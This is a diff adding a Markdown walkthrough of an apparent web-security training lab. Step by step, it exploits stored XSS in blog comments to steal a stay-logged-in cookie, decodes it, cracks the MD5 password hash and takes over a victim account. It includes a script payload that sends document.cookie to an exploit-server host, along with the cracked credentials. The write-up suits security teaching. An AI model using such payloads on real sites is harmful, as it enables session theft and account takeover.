@@ -4826,7 +4826,317 @@ With salt:
 
 > Storing a password hash directly in a cookie is insecure because attackers may be able to recover the original password using public hash databases. Using a unique salt before hashing helps protect against this attack.
 
+# Exploiting XSS to Steal a Stay-Logged-In Cookie
+
 ![lab](images/lab9.png)
 
 
+## Step 1: Investigate the Stay Logged In Functionality
 
+1. Log in using your own account.
+2. Enable:
+
+```text
+☑ Stay logged in
+```
+
+3. Submit the login form.
+
+---
+
+## Step 2: Examine the Cookie
+
+1. Open Burp Suite.
+2. Go to:
+
+```text
+Proxy > HTTP History
+```
+
+3. Select the login request.
+4. View the response.
+
+Locate:
+
+```http
+Set-Cookie: stay-logged-in=<value>
+```
+
+---
+![lab](images/rr.png)
+
+## Step 3: Decode the Cookie
+
+1. Copy the cookie value.
+2. Send it to:
+
+```text
+Decoder
+```
+
+3. Decode as Base64.
+
+Example:
+
+```text
+wiener:51dc30ddc473d43a6011e9ebba6ca770
+```
+
+---
+![lab](images/dc.png)
+
+4,open this and pest that hash their : https://crackstation.net/
+
+![lab](images/cs.png)
+
+
+## Step 4: Understand Cookie Structure
+
+The cookie format is:
+
+```text
+username:md5(password)
+```
+
+Example:
+
+```text
+wiener:md5(peter)
+```
+
+---
+
+# Find an XSS Vulnerability
+
+## Step 5: Inspect Blog Comments
+
+1. Browse the blog posts.
+2. Notice that comments are vulnerable to:
+
+```text
+Stored Cross-Site Scripting (Stored XSS)
+```
+## Step 6: Open Exploit Server
+
+1. Click:
+
+```text
+Exploit Server
+```
+
+2. Copy the exploit server URL.
+
+Example:
+
+```text
+https://YOUR-ID.exploit-server.net
+```
+![lab](images/urlex.png)
+
+# Steal Victim Cookie
+
+## Step 7: Post Malicious Comment
+
+Go to any blog post and submit a comment containing:
+
+```html
+<script>
+document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie
+</script>
+```
+
+Replace:
+
+```text
+YOUR-EXPLOIT-SERVER-ID
+```
+
+with your own exploit server ID.
+
+```html
+<script>
+document.location=' https://exploit-0aac00f403750af080b98e90016100c9.exploit-server.net/exploit'+document.cookie
+</script>
+```
+
+Submit the comment.
+
+---
+
+## Step 8: Wait for Victim Visit
+
+When the victim views the blog comment:
+
+```text
+JavaScript executes automatically.
+```
+
+The victim's browser sends:
+
+```text
+document.cookie
+```
+
+to your exploit server.
+
+---
+
+## Step 9: View Access Log
+
+1. Open:
+
+```text
+Exploit Server
+```
+
+2. Click:
+
+```text
+Access Log
+```
+
+You should see a request similar to:
+
+```http
+GET /stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+```
+
+---
+
+# Decode the Stolen Cookie
+
+## Step 10: Send Cookie to Decoder
+
+1. Copy the cookie value.
+2. Open:
+
+```text
+Burp Decoder
+```
+
+3. Decode Base64.
+
+Result:
+
+```text
+carlos:26323c16d5f4dabff3bb136f2460a943
+```
+
+---
+
+## Step 11: Extract the Hash
+
+Username:
+
+```text
+carlos
+```
+
+Hash:
+
+```text
+26323c16d5f4dabff3bb136f2460a943
+```
+
+---
+
+# Crack the Password
+
+## Step 12: Identify the Password
+
+Search the MD5 hash.
+
+Hash:
+
+```text
+26323c16d5f4dabff3bb136f2460a943
+```
+
+Result:
+
+```text
+onceuponatime
+```
+
+Password discovered:
+
+```text
+onceuponatime
+```
+
+---
+
+# Access Victim Account
+
+## Step 13: Login as Carlos
+
+Use:
+
+```text
+Username: carlos
+Password: onceuponatime
+```
+
+Login successfully.
+
+---
+
+## Step 14: Open My Account
+
+Navigate to:
+
+```text
+My Account
+```
+
+---
+
+## Step 15: Delete Account
+
+1. Click:
+
+```text
+Delete account
+```
+
+2. Confirm deletion.
+
+The lab is now solved.
+
+---
+
+# Vulnerability Explanation
+
+## Cookie Structure
+
+```text
+Base64(username:md5(password))
+```
+
+Example:
+
+```text
+carlos:26323c16d5f4dabff3bb136f2460a943
+```
+
+---
+
+## Attack Flow
+
+```text
+Stored XSS
+      ↓
+Steal Cookie
+      ↓
+Decode Base64
+      ↓
+Extract MD5 Hash
+      ↓
+Crack Password Offline
+      ↓
+Login as Victim
+      ↓
+Delete Account
+```
+
+---
